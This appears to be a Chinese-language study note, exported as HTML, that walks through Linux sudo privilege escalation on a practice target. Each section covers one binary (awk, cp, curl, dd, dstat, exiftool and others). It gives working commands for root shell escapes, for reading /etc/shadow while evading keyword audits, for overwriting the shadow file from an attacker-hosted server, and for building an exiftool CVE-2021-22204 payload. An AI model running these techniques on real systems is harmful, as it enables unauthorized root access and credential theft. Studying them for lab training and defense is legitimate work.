<h2 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129211228297.png?lastModify=1766751620" alt="image-20251129211228297"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6201" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> <span class="cm-builtin">awk</span> <span class="cm-string">'BEGIN {system("/bin/bash")}'</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129211307538.png?lastModify=1766751620" alt="image-20251129211307538"></p>
<p><strong>整个</strong><code>&#39; &#39;</code>内的是传递给 <code>awk</code>的脚本</p>
<p><code>BEGIN</code>是<code>awk</code>的特殊模式，表示在处理任何输入之前执行的动作</p>
<p>**而我们让他执行的动作是执行系统命令 **<code>system</code> 启动一个 <code>/bin/bash</code>的环境</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129211922100.png?lastModify=1766751620" alt="image-20251129211922100"></p>
<p><strong>提权成功</strong></p>
<h2 id="sudo-base64-58-32-nc-z"><a href="#sudo-base64-58-32-nc-z" class="headerlink" title="sudo base64&#x2F;58&#x2F;32&#x2F;nc&#x2F;z"></a>sudo base64&#x2F;58&#x2F;32&#x2F;nc&#x2F;z</h2><p><strong>base64&#x2F;58&#x2F;32&#x2F;nc&#x2F;z  均可实现提权，过程一致</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129214843910.png?lastModify=1766751620" alt="image-20251129214843910"></p>
<p><strong>只要 sudoers 里给你 <code>base64</code> 的权限，你就能读任何 root 文件</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129212023062.png?lastModify=1766751620" alt="image-20251129212023062"></p>
<p><strong>开始时，我们没权访问</strong><code>shadow</code></p>
<p><strong>我们先声明一个变量，名字任取，这里叫</strong><code>RedteamNotes</code> 内容是<code>/etc/shadow</code></p>
<p><strong>然后</strong><code>sudo base64 &quot;$RedteamNotes&quot;</code>将变量的名字进行<strong>编码</strong> 然后 <code>base64 -d</code>进行<strong>解码</strong></p>
<p><strong>一编一解，对我们来说看到的还是明文，但他确实以</strong><code>sudo</code>权限的base64来完成的</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129212838451.png?lastModify=1766751620" alt="image-20251129212838451"></p>
<p><strong>可以查看shadow的内容，发现root的密码hash</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129213428214.png?lastModify=1766751620" alt="image-20251129213428214"></p>
<p><strong>下面的步骤还是整行取出，然后</strong><code>john</code>破解得到密码，<code>su</code>登录root即可</p>
<p><strong>过程必须完整下图只是加密，看不懂内容，要配合解密</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129213952304.png?lastModify=1766751620" alt="image-20251129213952304"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129214623097.png?lastModify=1766751620" alt="image-20251129214623097"></p>
<p><code>RedteamNotes=/etc/shadow</code> **只是给变量赋值，避免后面命令里直接出现文件名，**<strong>绕过简单关键字审计</strong></p>
<h2 id="sudo-bash"><a href="#sudo-bash" class="headerlink" title="sudo bash"></a>sudo bash</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129215007011.png?lastModify=1766751620" alt="image-20251129215007011"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129215028547.png?lastModify=1766751620" alt="image-20251129215028547"></p>
<p><strong>十分简单，但确实很多场景中 低权限用户想便于直接提升至root设置的</strong></p>
<p><strong>要知道 ****<code>bash和csh和ash和sh和tclsh和zsh</code>** <strong>本身</strong>就是**shell</strong>，直接提权</p>
<h2 id="sudo-cp"><a href="#sudo-cp" class="headerlink" title="sudo cp"></a>sudo cp</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129215612701.png?lastModify=1766751620" alt="image-20251129215612701"></p>
<p><strong>在kali中生成自定义的shadow中的root用户的密码hash</strong></p>
<p><strong>在kali中做些准备</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6249" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mkpasswd <span class="cm-attribute">-m</span> sha-512 想设的密码明文</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**生成明文密码的hash **	<strong>-m指定加密方式(Linux用户的shadow文件中存储的是</strong><code>sha-512</code>加密的hash值)</p>
<p><strong>然后看通常Linux中的shadow记录的格式，这里以kali举例，将复制的root的hash值改为我们生成的，然后保存一下</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129215943474.png?lastModify=1766751620" alt="image-20251129215943474"></p>
<ul>
<li>**在靶机中，先声明一个变量 **<code>RedteamNotes</code></li>
<li><strong>然后再生成一个TF的变量，指向的是用</strong><code>mktemp</code>生成的临时文件</li>
<li><strong>然后将我们刚才生成的 shadow记录写到TF当中</strong></li>
<li><strong>TF变量的内容 这是</strong><code>mktemp</code>生成的临时文件，里面的是我们写入的shadow记录</li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129220555023.png?lastModify=1766751620" alt="image-20251129220555023"></p>
<p><strong>开始利用</strong>	<code>/usr/bin/cp</code>是cp命令 跟&#x2F;bin&#x2F;bash 一样</p>
<p>**然后将 $TF  copy  到  **<code>RedteamNotes</code>变量里面，而 <code>RedteamNotes</code>指向的是靶机中&#x2F;etc&#x2F;shadow所在位置</p>
<p><strong>不论是靶机还是实际，整个操作都是有损的，一定要做好备份</strong><code>cp /etc/shadow /tmp/shadow.bak</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129221115011.png?lastModify=1766751620" alt="image-20251129221115011"></p>
<table>
<thead>
<tr>
<th><strong>文件 → 文件</strong></th>
<th><code>cp file1 file2</code></th>
<th><strong>把 file1 内容复制到 file2（不存在则新建，存在则覆盖）</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>-i</code></td>
<td><strong>交互式确认覆盖</strong></td>
<td><code>cp -i file1 file2</code></td>
</tr>
</tbody></table>
<h2 id="sudo-cpulimit"><a href="#sudo-cpulimit" class="headerlink" title="sudo cpulimit"></a>sudo cpulimit</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130191730782.png?lastModify=1766751620" alt="image-20251130191730782"></p>
<p><strong>当前用户可以以root权限，不输入密码的执行这个可执行文件</strong></p>
<ul>
<li><code>-l</code> 限制cpu的使用率 100%</li>
<li><code>-f</code> 指定一个程序，按照 <code>-l</code> 的参数去使用cpu的使用率</li>
<li>**我们指定 **<code>/bin/bash</code>程序，所以就成了用<code>sudo</code>权限执行&#x2F;bin&#x2F;bash，要求cpu100%都用于他，提权到root</li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130192213712.png?lastModify=1766751620" alt="image-20251130192213712"></p>
<h2 id="sudo-curl"><a href="#sudo-curl" class="headerlink" title="sudo curl"></a>sudo curl</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130192333488.png?lastModify=1766751620" alt="image-20251130192333488"></p>
<p><strong>在kali中生成自定义的shadow中的root用户的密码hash</strong></p>
<p><strong>在kali中做些准备</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6299" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mkpasswd <span class="cm-attribute">-m</span> sha-512 想设的密码明文</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**生成明文密码的hash **	<strong>-m指定加密方式(Linux用户的shadow文件中存储的是</strong><code>sha-512</code>加密的hash值)</p>
<p><strong>然后看通常Linux中的shadow记录的格式，这里以kali举例，将复制的root的hash值改为我们生成的，然后保存一下</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129215943474.png?lastModify=1766751620" alt="image-20251129215943474"></p>
<p>**在kali新起一个服务器 **<code>sudo php -S 0:80</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130192804246.png?lastModify=1766751620" alt="image-20251130192804246"></p>
<ul>
<li>**用靶机 **<code>curl</code> 访问我们的kali中存有自定义密码hash的文件</li>
<li><code>-o</code> 将该文件输出到靶机中的shadow文件中，实现覆盖掉原有的shadow文件</li>
<li><strong>不论是靶机还是实际，整个操作都是有损的，一定要做好备份</strong><code>cp /etc/shadow /tmp/shadow.bak</code></li>
<li>**然后 **<code>su</code>切换root用户，输入我们自定义的密码<code>123456</code>即可</li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130193010133.png?lastModify=1766751620" alt="image-20251130193010133"></p>
<h2 id="sudo-date"><a href="#sudo-date" class="headerlink" title="sudo date"></a>sudo date</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130193122133.png?lastModify=1766751620" alt="image-20251130193122133"></p>
<p><code>-f</code> 指定一个文件，从这个文件中读取时间，但是我们给他的是 <code>/etc/shadow</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130193243186.png?lastModify=1766751620" alt="image-20251130193243186"></p>
<p><strong>他报错了，说这不是合法信息</strong></p>
<p><strong>也就是说，</strong><code>date</code>将每一行都当成日期来处理，发现不是合法日期格式。</p>
<p><strong>重要的是顺便****泄漏了shadow里面的每一行信息</strong>，我们可以尝试hash碰撞破解</p>
<p><strong>依旧是整行取出，放到kali保存文件，然后john破解</strong></p>
<h2 id="sudo-dd"><a href="#sudo-dd" class="headerlink" title="sudo dd"></a>sudo dd</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130193729266.png?lastModify=1766751620" alt="image-20251130193729266"></p>
<p><code>dd</code>作为一个命令行工具，功能是对原始数据进行低级别的复制和转换。</p>
<p><code>dd</code>即 <code>date diublicate</code>数据复制，</p>
<p><strong>他的使用非常灵活，可以用于：复制数据，转换数据编码，生成文件…</strong></p>
<p><code>dd</code> 是 Linux&#x2F;Unix 的 <strong>“裸字节搬运工”</strong>——按 <strong>块</strong> 读写，<strong>不解释文件系统、不解析目录结构</strong>，只认 “if&#x3D;输入 → of&#x3D;输出”，因此既能克隆整盘，也能恢复分区、制造 ISO、擦除数据、测速、造空壳镜像，被戏称 <strong>“磁盘大杀器”</strong>（<strong>Disk Destroyer</strong>）。</p>
<p><strong>在kali中生成自定义的shadow中的root用户的密码hash</strong></p>
<p><strong>在kali中做些准备</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6341" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">mkpasswd <span class="cm-attribute">-m</span> sha-512 想设的密码明文</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**生成明文密码的hash **	<strong>-m指定加密方式(Linux用户的shadow文件中存储的是</strong><code>sha-512</code>加密的hash值)</p>
<p><strong>然后看通常Linux中的shadow记录的格式，这里以kali举例，将复制的root的hash值改为我们生成的，然后保存一下</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251129215943474.png?lastModify=1766751620" alt="image-20251129215943474"></p>
<p><strong>然后在靶机中</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n6346" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">echo '自定义root行' | sudo dd of=/etc/shadow</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>of :outfile</code>输出文件，给到shadow</li>
<li><strong>把一条shadow记录通过<code>dd</code>(有<code>sudo</code>权限)，输出(of)到靶机的shadow文件，相当于覆盖掉</strong></li>
<li><strong>不论是靶机还是实际，整个操作都是有损的，一定要做好****备份</strong><code>cp /etc/shadow /tmp/shadow.bak</code></li>
<li>**然后 **<code>su</code>切换root用户，输入我们自定义的密码<code>123456</code>即可</li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130194636157.png?lastModify=1766751620" alt="image-20251130194636157"></p>
<h2 id="sudo-dstat"><a href="#sudo-dstat" class="headerlink" title="sudo dstat"></a>sudo dstat</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130194935400.png?lastModify=1766751620" alt="image-20251130194935400"></p>
<p><strong>它有一个参数，可以通过指定插件名来****执行外部的插件</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130194951350.png?lastModify=1766751620" alt="image-20251130194951350"></p>
<p><strong>编辑一个能执行提权逻辑的插件x</strong></p>
<p><strong>首先查找</strong><code>dstat</code>的插件目录 <code>find / -name dstat -type d 2&gt;/dev/null</code></p>
<table>
<thead>
<tr>
<th><code>find /</code></th>
<th><strong>搜索起始路径为</strong><code>/</code>（整盘）</th>
</tr>
</thead>
<tbody><tr>
<td><code>-name dstat</code></td>
<td><strong>文件名（目录名）必须严格等于</strong><code>dstat</code></td>
</tr>
<tr>
<td><code>-type d</code></td>
<td><strong>只匹配****目录</strong>（directory），普通文件、链接等跳过</td>
</tr>
</tbody></table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130195328706.png?lastModify=1766751620" alt="image-20251130195328706"></p>
<p><strong>第一个是</strong><code>dstat</code>的文档，第二个是插件目录。**	**目录如下</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130195425316.png?lastModify=1766751620" alt="image-20251130195425316"></p>
<p>**使用 python插件的格式是，去掉前缀 **<code>dstat_</code> 后面的都是插件的名称。</p>
<p><strong>按照这个格式构造一个插件，同时写入提权逻辑（注意构造的插件必须放在</strong><code>dstat</code>插件目录里）</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6380" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">vim</span> dstat_name.py</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">import os;os.execv(<span class="cm-string">"/bin/bash"</span>,[<span class="cm-string">"bash"</span>])</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130195643546.png?lastModify=1766751620" alt="image-20251130195643546"></p>
<table>
<thead>
<tr>
<th><strong>代码</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>import os</code></td>
<td><strong>载入标准库</strong><code>os</code>模块</td>
</tr>
<tr>
<td><code>os.execv(path, args)</code></td>
<td><strong>exec 家族系统调用</strong>的 Python 封装；<strong>当前进程镜像</strong>被新程序覆盖，PID 不变，后续 Python 代码永远不会再执行</td>
</tr>
<tr>
<td><strong>第 1 个参数</strong><code>&quot;/bin/bash&quot;</code></td>
<td><strong>要加载的可执行文件路径</strong></td>
</tr>
<tr>
<td><strong>第 2 个参数</strong><code>[&quot;bash&quot;]</code></td>
<td><strong>传给新程序的</strong><code>argv[]</code>数组；**argv[**0]****即进程名，这里写成<code>&quot;bash&quot;</code>（可随意改，但惯例用程序名）</td>
</tr>
</tbody></table>
<p><strong><code>os.execv(&quot;/bin/bash&quot;, [&quot;bash&quot;])</code> &#x3D; 当前 Python 进程瞬间“变身” bash，PID 不变，Python 代码后续不再执行。</strong></p>
<p>**然后用 **<code>dstat</code>执行这个插件 <code>sudo dstat --name</code> 即可获得root权限</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130200456902.png?lastModify=1766751620" alt="image-20251130200456902"></p>
<p>**PID 就是 **<strong>Process Identifier</strong>——<strong>进程身份证号</strong>。</p>
<p><strong>PID 就是 Linux 给每个运行中进程发的“学号”，系统调用、信号、调试、杀进程全靠它定位。</strong></p>
<ul>
<li>**是一个 **<strong>正整数</strong>，由内核在进程诞生时分配。</li>
<li><strong>唯一</strong>（同一命名空间内同一时刻不会重复）。</li>
<li><strong>进程消亡后，该号码会被回收，过段时间可能重新分配给新进程。</strong></li>
</ul>
<h2 id="sudo-ed"><a href="#sudo-ed" class="headerlink" title="sudo ed"></a>sudo ed</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130200731930.png?lastModify=1766751620" alt="image-20251130200731930"></p>
<p><code>ed</code>是一个文本编辑器</p>
<p><code>sudo /usr/bin/ed</code>此时已经进入<code>ed</code>编辑器当中，任何操作都属于编辑行为</p>
<p><code>!</code>告诉编辑器<strong>执行系统命令</strong> ，然后启动一个<code>/bin/bash</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130201030298.png?lastModify=1766751620" alt="image-20251130201030298"></p>
<h2 id="sudo-env"><a href="#sudo-env" class="headerlink" title="sudo env"></a>sudo env</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130201121563.png?lastModify=1766751620" alt="image-20251130201121563"></p>
<p><code>env</code>即<code>environment</code>通常用于设置和显示环境变量的值，只是在这个利用中，<code>env</code>命令用于在指定环境中执行后面的命令</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130201312704.png?lastModify=1766751620" alt="image-20251130201312704"></p>
<p>** **<strong>利用 <code>sudo</code> 允许你运行 <code>env</code> 的权限，把当前用户的环境变量“原封不动”地传给一个新的 <code>/bin/bash</code>，从而拿到 root 交互式 shell</strong> 的典型 <strong>sudo 提权&#x2F;绕限制</strong> 技巧。</p>
<h2 id="sudo-exiftool"><a href="#sudo-exiftool" class="headerlink" title="sudo exiftool"></a>sudo exiftool</h2><p><strong>查看图形图像源数据的工具</strong></p>
<p><strong>try hack me</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130201648971.png?lastModify=1766751620" alt="image-20251130201648971"></p>
<p><strong>CVE 2021-22204                       exploit-db编号  50911可以看文档</strong></p>
<p><strong>首先编辑一个payload在其中写入源数据（指定的格式）</strong><code>(metdata &quot;\c${system(&#39;/bin/bash&#39;)};&quot;)</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130202706004.png?lastModify=1766751620" alt="image-20251130202706004"></p>
<p><strong>然后用</strong><code>bzz</code>这个压缩工具进行压缩（利用就是这么说的）</p>
<p><strong>然后用</strong><code>djvumake</code>生成一个利用文件<code>exploit.djvu</code>，里面包含了提权逻辑（他是用来创建和转换<code>djvu</code>格式文件的工具，而<code>djvu</code>是一种图像压缩文件，主要用于扫描文档和电子书）</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130202736411.png?lastModify=1766751620" alt="image-20251130202736411"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6441" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">vi</span> payload<span class="cm-tab" role="presentation" cm-text="	">  </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-comment">#里面编辑      (metdata "\c${system('/bin/bash')};")</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">bzz payload payload.bzz</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation">djvumake exploit.djvu <span class="cm-def">INFO</span><span class="cm-operator">=</span><span class="cm-string">'1,1'</span> <span class="cm-def">BGjp</span><span class="cm-operator">=</span>/dev/null <span class="cm-def">ANTz</span><span class="cm-operator">=</span>payload.bzz</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> exiftool exploit.djvu</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><strong>思路详解：</strong></p>
<p><code>vi payload</code>			**#里面编辑      **<code>(metdata &quot;\c${system(&#39;/bin/bash&#39;)};&quot;)</code></p>
<table>
<thead>
<tr>
<th><strong>片段</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>metdata</code></td>
<td><strong>伪造的 DjVu 关键字，随便写也行，只要让 ExifTool 把它当普通文本字段解析即可。</strong></td>
</tr>
<tr>
<td><code>\c</code></td>
<td><strong>DjVu 语法里的</strong>**“换行 + 继续”**转义，相当于把后面内容当成同一行，避免解析错误。</td>
</tr>
<tr>
<td><code>${ ... }</code></td>
<td><strong>Perl 的****字符串内插</strong>，ExifTool 内部用<code>eval</code>处理时会先执行花括号里的表达式。</td>
</tr>
<tr>
<td><code>system(&#39;/bin/bash&#39;)</code></td>
<td><strong>真正的攻击载荷：启动一个****交互式 bash</strong>（当前 ExifTool 已是 sudo root，所以是 root shell）。</td>
</tr>
<tr>
<td><strong>末尾</strong><code>;</code></td>
<td><strong>Perl 语法结束符，让 eval 不报错。</strong></td>
</tr>
</tbody></table>
<hr>
<p><code>bzz payload payload.bzz</code></p>
<hr>
<ul>
<li><code>bzz</code> 是 DjVuLibre 套件里的 <strong>Burrows-Wheeler 压缩工具</strong>，专门把任意文件压成 <code>.bzz</code> 流。</li>
<li>**目的：让后面 **<code>djvumake</code> 能把 payload 当作 <strong>DjVu 注释流（ANTz）</strong> 嵌入。</li>
</ul>
<hr>
<p><code>djvumake exploit.djvu INFO=&#39;1,1&#39; BGjp=/dev/null ANTz=payload.bzz</code></p>
<hr>
<ul>
<li><code>djvumake</code> 也是 DjVuLibre 工具，用于 <strong>手工拼装 DjVu 文件</strong>。</li>
<li><strong>参数含义</strong> **– <strong><code>INFO=&#39;1,1&#39;</code>  页面尺寸（宽 1 像素高 1 像素，够跑就行）</strong> <strong>– <code>BGjp=/dev/null</code>  背景图用空设备，表示“无图”</strong> **– <code>ANTz=payload.bzz</code>  <strong>把前面压好的 payload 塞进注释（Annotation）流</strong></li>
</ul>
<p>**结果：生成一个 **<strong>语法合法的 DjVu 文档</strong> <code>exploit.djvu</code>，但其 ANTz 段藏有我们的恶意代码。</p>
<hr>
<p><code>sudo exiftool exploit.djvu</code></p>
<hr>
<ul>
<li><strong>ExifTool ≤ 12.23</strong> 解析 DjVu 时，会 <strong>调用 Perl 的 <code>eval</code> 去执行 ANTz 段里的代码</strong>（CVE-2021-22204）。</li>
<li>**因为有 **<code>sudo</code>，<code>exiftool</code> 以 <strong>root</strong> 身份运行，于是 payload 直接拿到 root  shell &#x2F; 反弹 meterpreter &#x2F; 写 suid 等。</li>
</ul>
<h2 id="sudo-expect"><a href="#sudo-expect" class="headerlink" title="sudo expect"></a>sudo expect</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130205345390.png?lastModify=1766751620" alt="image-20251130205345390"></p>
<p><strong>这个命令可以模拟用户的键盘输入，可以自动化需要用户交互的过程，主要用于脚本和其他自动化环境之中</strong></p>
<ul>
<li><code>-c</code>允许直接在命令行中输入<code>expect</code>脚本代码而不是从文件中读取</li>
<li><code>spawn</code>生成的意思，生成一个 <code>/bin/bash</code>环境<code>;</code>指定他是交互的interact</li>
</ul>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6501" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> expect <span class="cm-attribute">-c</span> <span class="cm-string">"spawn /bin/bash;interact"</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251130205006234.png?lastModify=1766751620" alt="image-20251130205006234"></p>
<p><strong>执行文件的提权，很多都是靠sudo权限，然后通过他的配置文件&#x2F;参数 启动系统命令实现</strong></p>
<hr>
